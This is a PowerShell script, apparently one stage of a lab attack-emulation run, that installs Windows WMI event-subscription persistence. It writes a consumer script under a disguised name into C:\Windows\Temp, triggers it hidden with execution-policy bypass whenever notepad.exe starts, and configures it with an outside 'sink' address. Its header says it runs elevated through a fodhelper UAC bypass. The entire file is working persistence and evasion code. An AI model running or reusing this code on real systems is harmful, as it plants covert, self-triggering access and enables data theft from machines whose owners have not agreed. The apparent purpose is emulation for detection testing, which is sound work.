# S3 - WMI persistence install. Runs elevated (hidden) via the fodhelper UAC bypass.
# Reads payloads/consumer.ps1, injects the run-scoped config, writes the consumer to
# C:\Windows\Temp\svhw.ps1, then registers the filter / consumer / binding
# (idempotent: prior objects of the same names are removed first).
#
# Run-scoped config (embedded at build time by the operator):
$RunId    = "RUN-20261003-01"
$SinkBase = "http://192.168.106.1:9180"   # e.g. http://<lab-host>:9180
$VictimHost = "wmi"

$ConsumerPath = "C:\Windows\Temp\svhw.ps1"
$FilterName   = "NotepadFilter"
$ConsumerName = "SystemDumpConsumer"

# --- materialize consumer with run-scoped config ------------------------------
$source = Join-Path $PSScriptRoot "consumer.ps1"
if (-not (Test-Path $source)) { Write-Host "[S3] missing consumer.ps1 next to installer"; exit 1 }
# byte-fidelity read/write (no BOM, no line-ending conversion) so the on-disk
# svhw.ps1 is byte-identical to the staged consumer and the EID 11 hash of the write
# event equals the staged artifact hash (module-integrity link).
$body = [System.IO.File]::ReadAllText($source, [System.Text.Encoding]::UTF8)
$body = $body.Replace("RUN-20261003-01", $RunId).Replace("http://192.168.106.1:9180", $SinkBase).Replace("wmi", $VictimHost)
[System.IO.File]::WriteAllText($ConsumerPath, $body,
    (New-Object System.Text.UTF8Encoding($false)))
if (-not (Test-Path $ConsumerPath)) { Write-Host "[S3] consumer write failed"; exit 1 }

# config-carry-over verification (run id inside the artifact, not just the path)
$written = [System.IO.File]::ReadAllText($ConsumerPath, [System.Text.Encoding]::UTF8)
if (-not $written.Contains($RunId)) { Write-Host "[S3] run id missing in written consumer"; exit 1 }
Write-Host "[S3] consumer materialized: $ConsumerPath (run $RunId)"

# --- idempotent removal of a prior subscription -------------------------------
$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match $FilterName -or $_.Consumer -match $ConsumerName }
$bindings | ForEach-Object { $_ | Remove-WmiObject -ErrorAction SilentlyContinue }
$oldConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue
if ($oldConsumer) { $oldConsumer | Remove-WmiObject -ErrorAction SilentlyContinue }
$oldFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue
if ($oldFilter) { $oldFilter | Remove-WmiObject -ErrorAction SilentlyContinue }
Start-Sleep -Milliseconds 500

# --- register filter / consumer / binding --------------------------------------
Write-Host "[S3] registering __EventFilter ($FilterName)"
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name           = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
} -ErrorAction Stop

Write-Host "[S3] registering CommandLineEventConsumer ($ConsumerName)"
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name                = $ConsumerName
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -noni -f `"$ConsumerPath`""
    RunInteractively    = $false
} -ErrorAction Stop

Write-Host "[S3] registering __FilterToConsumerBinding"
$binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $filter
    Consumer = $consumer
} -ErrorAction Stop

Write-Host "[S3] persistence installed: filter=$FilterName consumer=$ConsumerName trigger=notepad.exe"